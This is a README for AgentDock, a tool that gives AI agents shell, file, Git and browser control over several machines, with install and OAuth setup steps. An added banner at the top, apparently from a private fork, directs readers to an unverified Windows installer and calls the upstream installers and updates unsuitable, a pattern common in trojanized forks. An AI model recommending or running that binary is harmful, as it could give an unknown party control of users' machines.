# Personal AgentDock · v0.7.9 Native Windows Desktop Installer

**Recommended native Windows WPF GUI setup (~104 MB):** [Download AgentDockSetup-amd64.exe](https://github.com/asdfg3482968521-alt/agentdock/releases/download/agentdock-desktop-latest/AgentDockSetup-amd64.exe). Run Setup, then open **AgentDock** from the Windows Start Menu. It includes the original WPF control panel, tray, self-contained desktop runtime, and core service.

> **Do not use the old 14 MB AgentDock-OneClick-Windows.zip expecting the original GUI.** That package is only a CLI and auxiliary PowerShell config panel, not the integrated desktop application.
>
> The native GUI currently manages Cloudflare tunnels. ngrok paste and process-management features are in a separate legacy helper, not yet in the native WPF tunnel page. Never run both core supervisors on the same port.
>
> This private fork is not the upstream uvwt/agentdock release. Upstream installers and auto-update links below are not suitable for your customized build.

[Native desktop Release](https://github.com/asdfg3482968521-alt/agentdock/releases/tag/agentdock-desktop-latest) · [Download branch](https://github.com/asdfg3482968521-alt/agentdock/tree/download/windows-latest/downloads)

---

<div align="center">

English | [简体中文](./README.zh-CN.md)

<img src="./docs/assets/agentdock-logo.png" alt="AgentDock logo" width="128" />

# AgentDock MCP

**Give AI agents secure, controlled access to every machine you operate.**

Open ChatGPT in your browser and manage multiple computers and servers from one conversation. Write code, change configuration, run commands, and deploy in the real environment where the work belongs—without consuming a dedicated Codex coding quota.

[Quick Start](https://uvwt.github.io/agentdock-docs/docs/getting-started/install) · [Documentation](https://uvwt.github.io/agentdock-docs/) · [Releases](https://github.com/uvwt/agentdock/releases) · [Issues](https://github.com/uvwt/agentdock/issues)

[![CI](https://github.com/uvwt/agentdock/actions/workflows/ci.yml/badge.svg)](https://github.com/uvwt/agentdock/actions/workflows/ci.yml)
[![GitHub Release](https://img.shields.io/github/v/release/uvwt/agentdock?display_name=tag&logo=github)](https://github.com/uvwt/agentdock/releases)
[![Docker Hub](https://img.shields.io/docker/pulls/agentdockio/agentdock?logo=docker&label=Docker%20Hub)](https://hub.docker.com/r/agentdockio/agentdock)
[![GHCR](https://img.shields.io/badge/GHCR-ghcr.io%2Fuvwt%2Fagentdock-2496ED?logo=docker&logoColor=white)](https://github.com/uvwt/agentdock/pkgs/container/agentdock)
[![License](https://img.shields.io/github/license/uvwt/agentdock)](./LICENSE)

</div>

<p align="center">
  <img
    src="./docs/assets/agentdock-multi-device.png"
    alt="AgentDock: operate multiple devices from one AI conversation"
    width="100%"
  />
</p>

## What is AgentDock?

AgentDock is an independent tool runtime for AI agents.

It provides unified, secure, and controlled file, command, Git, Skill, MCP, browser automation, and task execution across local computers, remote servers, and containers. Connect multiple AgentDock instances to coordinate work across devices and finish multi-machine workflows in a single conversation.

AgentDock does not provide a chat interface or perform model inference. It focuses on one responsibility:

> Let AI agents operate real environments within explicit permission boundaries and return structured, traceable, and verifiable results.

```text
              ChatGPT / Claude / Codex
                        │
                        │ MCP (multiple instances supported)
          ┌─────────────┼─────────────┐
          ▼             ▼             ▼
   ┌───────────┐ ┌───────────┐ ┌───────────┐
   │ AgentDock │ │ AgentDock │ │ AgentDock │
   │ Local Mac │ │ LAN Host  │ │ Cloud VPS │
   └─────┬─────┘ └─────┬─────┘ └─────┬─────┘
         │             │             │
         ▼             ▼             ▼
   Files · Shell · Git  Tunnels       Proxy · Deploy
```

## What can AgentDock do?

- Manage multiple computers and servers directly from ChatGPT without repeatedly switching SSH sessions
- Write code, modify projects, run tests, and operate Git in the real local or remote environment without depending on a dedicated coding-agent quota
- Manage VPS hosts, Docker services, reverse proxies, and deployment configuration
- Inspect logs, processes, ports, and actual runtime state
- Operate authenticated web pages and macOS desktop applications
- Connect multiple AgentDock instances and coordinate cross-device work in one conversation
- Extend capabilities through Skills and dynamic MCP servers
- Persist long-running task state and continue after an interruption
- Use the same tool model across macOS, Linux, Windows, and containers
- And more

## Use case: complete a tunnel across devices

Suppose you have a computer behind NAT. Making it reachable externally usually requires work on two devices:

1. **Local computer:** start and verify the tunnel client
2. **Server:** configure forwarding, ports, domains, and the reverse proxy

Previously, you had to log in to both machines and switch back and forth. With AgentDock installed on each device and connected to the same ChatGPT conversation, the AI can operate both environments and complete the entire workflow.

The same pattern applies to multi-host deployments, local-to-public integration testing, cross-environment troubleshooting, batch configuration, and status inspection.

## Quick start

Regular users can install AgentDock from the official package for their operating system. You do not need the source code or Go.

See [Install AgentDock](https://uvwt.github.io/agentdock-docs/docs/getting-started/install) for the complete instructions.

| Platform | Recommended installation |
| --- | --- |
| Windows 11 | Graphical Windows installer (.exe) |
| macOS 13 or later | Universal graphical DMG |
| Linux | Official automated installer |
| Docker already installed | Docker Compose |

### Windows

1. Open the [latest release](https://github.com/uvwt/agentdock/releases/latest).
2. Download `AgentDockSetup-amd64.exe` for most Intel/AMD PCs, or `AgentDockSetup-arm64.exe` for Windows on ARM.
3. Double-click the installer and follow the on-screen instructions.
4. Choose a connection option based on where the MCP client runs and how you plan to use AgentDock.
5. Clicking **Finish** opens the control panel. **Create a desktop shortcut** is selected by default.

The installer includes the AgentDock core, control panel, core Skills, and Cloudflare component. Running the latest Setup again upgrades AgentDock while preserving tasks, Skills, configuration, connection settings, and the working directory by default.

See [Windows installation](https://uvwt.github.io/agentdock-docs/docs/getting-started/windows).

### macOS

1. Download `AgentDock-macos-universal.dmg` from the [latest release](https://github.com/uvwt/agentdock/releases/latest).
2. Open the DMG and drag `AgentDock.app` to Applications.
3. On the first launch, right-click AgentDock in Applications and choose **Open**.
4. Choose local-only, temporary public, or fixed-domain access in the graphical app, then select **Install and Start**.

The same DMG supports Apple Silicon and Intel Macs. The current version is not notarized by Apple, so the first launch needs one manual confirmation. You do not need to disable Gatekeeper.

See [macOS installation](https://uvwt.github.io/agentdock-docs/docs/getting-started/macos).

### Linux

Run:

```bash
curl -fsSL https://github.com/uvwt/agentdock/releases/latest/download/install.sh \
  -o /tmp/install-agentdock.sh
sudo env AGENTDOCK_NONINTERACTIVE=true sh /tmp/install-agentdock.sh
```

The installer uses safe defaults and completes installation, startup, and a health check. See [Linux installation](https://uvwt.github.io/agentdock-docs/docs/getting-started/linux).

### Docker

```bash
mkdir agentdock && cd agentdock
curl -fL \
  https://raw.githubusercontent.com/uvwt/agentdock/main/docker-compose.yml \
  -o docker-compose.yml
export AGENTDOCK_AUTH_TOKEN="$(openssl rand -hex 32)"
docker compose pull
docker compose up -d
```

The default MCP URL is `http://127.0.0.1:8765/mcp`. See [Docker installation](https://uvwt.github.io/agentdock-docs/docs/getting-started/docker) for persistence and public access.

### Choose a connection option

- **Local only:** the client and AgentDock run on the same computer.
- **Temporary public address:** ChatGPT, a phone, or another remote device needs access and no domain is ready. The address may change after the Tunnel restarts.
- **Fixed domain:** a stable address for long-term use. Requires a Cloudflare-managed domain and Tunnel Token.

After installation, get the MCP URL and Bearer Token or OAuth sign-in details from the control panel or terminal, then add them to the MCP, Tools, or Connectors settings in your client. Public access must keep authentication enabled. Do not include credentials in screenshots, issues, or public conversations.

## Connect an AI client

AgentDock exposes tools over MCP Streamable HTTP. The exact client syntax varies, but a typical configuration looks like this:

```json
{
  "mcpServers": {
    "agentdock": {
      "url": "http://127.0.0.1:8765/mcp",
      "headers": {
        "Authorization": "Bearer <AGENTDOCK_AUTH_TOKEN>"
      }
    }
  }
}
```

You may omit the `Authorization` header only when AgentDock listens exclusively on a loopback address and authentication is intentionally disabled. Any LAN or public deployment must use authentication together with HTTPS and network access controls.

## Platform installation

| Platform | Documentation |
| --- | --- |
| Docker | [Docker installation](https://uvwt.github.io/agentdock-docs/docs/getting-started/docker) |
| Linux | [Automated Linux installation](https://uvwt.github.io/agentdock-docs/docs/getting-started/linux) |
| Linux / VPS | [Manual systemd deployment](https://uvwt.github.io/agentdock-docs/docs/getting-started/vps) |
| macOS | [macOS installation](https://uvwt.github.io/agentdock-docs/docs/getting-started/macos) |
| Windows | [Graphical Windows installer](https://uvwt.github.io/agentdock-docs/docs/getting-started/windows) |

Each guide includes installation steps, startup checks, the MCP URL, and authentication details. Advanced documentation covers browser automation, macOS desktop control, Windows and WSL, reverse proxies, and data migration.

## Updates

Release binaries can report their version and update themselves:

```bash
agentdock --version
agentdock update
```

`agentdock update` downloads the latest release for the current platform, verifies its SHA-256 checksum, validates the new binary, backs up the current binary, and replaces it. If it detects a LaunchAgent, systemd service, Windows Service, highest-privilege scheduled task, or Windows user startup entry, it restarts the service and verifies the new version. A failed update restores the previous binary. Development builds cannot use this command. The Windows tray delegates to this same core update path; update the tray and Setup itself by running the newer `AgentDockSetup.exe`.

## Core capabilities

### Files and commands

- Read and search UTF-8 text, traverse directories, and apply structured edits
- Atomic file writes, path boundaries, and private-directory protection
- Command execution with timeout and output limits
- Separate stdout, stderr, and exit status
- Long-running command sessions, PTY, observation, input, and termination
- Output truncation and sensitive-value redaction
- macOS, Linux, Windows, and WSL support

### Git and GitHub

- Read repository status, diffs, and history
- Create commits, pull, and push
- Check access to GitHub repositories
- Inspect state before a change and verify the resulting diff afterward

### Skills and dynamic MCP

Official and community Skill sources live in [uvwt/agentdock-skills](https://github.com/uvwt/agentdock-skills). This repository only keeps the three bootstrap Skills that must ship with the AgentDock runtime.

- Validate, install, activate, and roll back Skill packages
- Stable, development, canary, and pinned release channels
- Isolated environment variables and runtimes for each Skill
- Register, enable, disable, refresh, and remove dynamic MCP servers
- Streamable HTTP and stdio transports
- Search tools, inspect schemas, and perform controlled calls
- Configuration isolation between MCP servers

### Native ACP

AgentDock can optionally act as a native ACP client and host a local coding-agent adapter.

- Desktop control panels provide presets for Codex, Claude, and Grok; host configuration controls whether ACP is enabled and which adapter is selected.
- Use `acp_session` to create and manage sessions, `acp_prompt` to run and observe prompts, and `acp_interaction` to answer agent permission requests.
- Optional ACP operations are available only when the connected adapter advertises the corresponding capability.
- ACP working directories follow the host process or container security boundary rather than an AgentDock filesystem allowlist; see [Security model](#security-model).

### Browser and desktop automation

- Start, close, and clean up browser sessions
- Navigate, click, type, select, and wait
- Inspect page text, interactive elements, errors, and network responses
- Persist login state, use dedicated browser profiles, and capture screenshots
- Use system Chrome and macOS desktop automation

### Recoverable tasks

- Persist task state
- Define explicit goals, steps, and completion conditions
- Record staged checkpoints
- Track blockers and resume after interruption
- Perform final review and evidence-based completion checks
- Reuse workflow templates

### Recall and NexusDock integration

AgentDock can optionally connect to NexusDock to provide centralized capabilities for multiple devices and agents:

- Long-term project memory
- Runbooks and experience records
- Workflow templates
- Private notes
- Multi-device state coordination

NexusDock is optional. Without it, AgentDock still provides its core file, command, Git, Skill, MCP, browser, and task capabilities independently.

## Connect ChatGPT with OAuth

OAuth is recommended when ChatGPT connects to a public AgentDock instance through a custom MCP plugin. AgentDock supports Authorization Code, PKCE S256, dynamic client registration, and Refresh Tokens. ChatGPT can register itself automatically, so you do not need to create a Client ID or Client Secret manually.

Configure at least:

```bash
AGENTDOCK_OAUTH_ENABLED=true
AGENTDOCK_SERVER_URL=https://agentdock.example.com
AGENTDOCK_OAUTH_PASSWORD=***
AGENTDOCK_OAUTH_TOKEN_SECRET=***
# Optional; defaults to 1h. Accepts Go durations, integer days such as 999999d, or never.
# In never mode, the server does not expire access tokens and advertises 999999d to OAuth clients for compatibility.
AGENTDOCK_OAUTH_ACCESS_TOKEN_TTL=1h
```

Then open **Settings > Plugins > Advanced settings** in ChatGPT, enable developer mode, and create a plugin using this MCP Server URL:

```text
https://agentdock.example.com/mcp
```

After you save the plugin, the browser opens the AgentDock authorization page. Confirm that the request belongs to the plugin you just created, enter `AGENTDOCK_OAUTH_PASSWORD`, finish authorization, and verify the connection with `server_info` or another read-only tool call.

A public endpoint must use HTTPS. `AGENTDOCK_SERVER_URL` must contain only the origin, without `/mcp`. See [Connect ChatGPT to AgentDock](https://uvwt.github.io/agentdock-docs/docs/guides/chatgpt) for the complete procedure, endpoint checks, and troubleshooting.

On Windows desktop installs, configure the OAuth access-token TTL from Control Panel > Advanced Settings. It accepts the same syntax as `AGENTDOCK_OAUTH_ACCESS_TOKEN_TTL`, including `1h`, `30d`, and `never`. Once saved, standard startup and elevated scheduled-task startup read the same `control-panel-settings.json`; leaving the field blank falls back to an inherited `AGENTDOCK_OAUTH_ACCESS_TOKEN_TTL`, and if neither is set the core default is `1h`. The desktop runtime also normalizes an accidentally pasted `https://agentdock.example.com/mcp` URL back to its origin.

## Image variants

| Image tag | Purpose |
| --- | --- |
| `latest` / `<version>` | Production runtime image without the Go toolchain |
| `dev-latest` / `dev-<version>` | Development image with Go, C, and C++ build tools |
| `browser-latest` / `browser-<version>` | Native Go CDP browser automation image with Chromium |

Browser tools (`browser_session`, `browser_act`, and `browser_snapshot`) use a native Go CDP runtime. Outside the browser image, AgentDock normally launches a locally installed Chrome, Chromium, or Microsoft Edge; it does not download a browser and browser automation does not require Node.js or Playwright.

You can also reuse an existing Chromium-family browser with remote debugging enabled. Pass a loopback `cdp_url` to `browser_session start`, or configure `AGENTDOCK_BROWSER_CDP_URL` in the environment/desktop settings when the endpoint is remote (for example from Docker). AgentDock creates and manages a dedicated target in the external browser; closing the AgentDock session does not exit that browser or adopt pre-existing user tabs. Cookie and localStorage injection are rejected for external sessions so AgentDock does not mutate the user's existing browser profile.

Set `AGENTDOCK_BROWSER_REUSE_EXISTING_CDP=true` in user configuration to opt in to local automatic reuse; it is off by default and tool calls cannot override it. Discovery only follows Chromium-family process `--remote-debugging-port` arguments and matching `DevToolsActivePort` files, and its HTTP probes bypass host proxy settings. No candidates falls back to the existing AgentDock-owned launch path, exactly one valid candidate is reused, and multiple candidates require an explicit configured CDP endpoint. Containers cannot enumerate host processes or profiles, so use an explicitly reachable configured CDP endpoint to attach to a host browser from Docker.

Production images are published to:

```text
ghcr.io/uvwt/agentdock
agentdockio/agentdock
```

Pin a specific version in production instead of depending on `latest` indefinitely:

```yaml
services:
  agentdock:
    image: ghcr.io/uvwt/agentdock:<version>
```

## Runtime directories

| Path | Purpose |
| --- | --- |
| `~/AgentDock` | Default working directory for relative file operations |
| `~/.agentdock` | AgentDock state, configuration, sessions, and extension data |

Docker deployments use named volumes for persistent data by default to avoid Linux bind-mount UID and GID conflicts. Mount only the host paths AgentDock actually needs; do not mount the entire host root.

## Ports

Default MCP URL for Docker, native installs, and local development:

`http://127.0.0.1:8765/mcp`

Ports are configurable. Clients must use the address defined by the actual deployment.

## Security model

AgentDock operates real host or container resources. Treat it as infrastructure and design deployment and authorization accordingly.

### Network security

- Authentication may be disabled only for a trusted deployment bound exclusively to a loopback address
- A non-loopback listener must use a Bearer Token or OAuth
- Public deployments must use HTTPS
- Combine the service with a firewall, reverse proxy, and network access controls
- Never expose an unauthenticated MCP service directly to the public internet

### Permission boundaries

- Run AgentDock under a dedicated system user
- Grant only the file permissions required for the task
- Mount only necessary directories into Docker
- Do not grant unnecessary root access, Docker Socket access, or host privileges
- Store Skill and dynamic MCP secrets in their isolated environments
- Configure the ACP executable, arguments, and environment mappings only on the host; remote tools cannot change them
- ACP working directories are not restricted by an AgentDock allowlist; the security boundary is the AgentDock process user plus host or container controls such as ACLs, mounts, and network policy

### Execution verification

- Keep command exit state separate from tool-call state
- Inspect the actual diff after changing files
- Verify processes, ports, logs, and service responses after deployment
- Define explicit completion conditions for long-running tasks
- Do not treat “the command ran” as proof that the task succeeded

## Run from source

This section is for contributors and developers who need to debug the runtime.

```bash
git clone https://github.com/uvwt/agentdock.git
cd agentdock

make check
make run
```

Source development mode listens on:

```text
http://127.0.0.1:8765/mcp
```

## Development and contribution

Run the full check before submitting code:

```bash
make check
```

GitHub Actions continuously run tests, static checks, builds, and release validation.

User documentation is maintained separately in [`uvwt/agentdock-docs`](https://github.com/uvwt/agentdock-docs). Changes to user-visible behavior, configuration, installation, or tool schemas should update the matching documentation in the same change set.

Submit bugs and feature requests through [GitHub Issues](https://github.com/uvwt/agentdock/issues).

## Project scope

AgentDock is a tool runtime, not a complete AI application platform.

It does not include a chat interface, model inference service, model account, or API quota, and it does not bypass authentication or operating-system security controls. ChatGPT, Claude, Codex, and other MCP-compatible agent clients can call AgentDock; the exact integration depends on each client's supported MCP transport and authentication features.

## Related links

- [Documentation](https://uvwt.github.io/agentdock-docs/)
- [Documentation source](https://github.com/uvwt/agentdock-docs)
- [GitHub Releases](https://github.com/uvwt/agentdock/releases)
- [GitHub Container Registry](https://github.com/uvwt/agentdock/pkgs/container/agentdock)
- [Docker Hub](https://hub.docker.com/r/agentdockio/agentdock)
- [Linux Do](https://linux.do/)

## License

Apache License 2.0. See [LICENSE](./LICENSE).
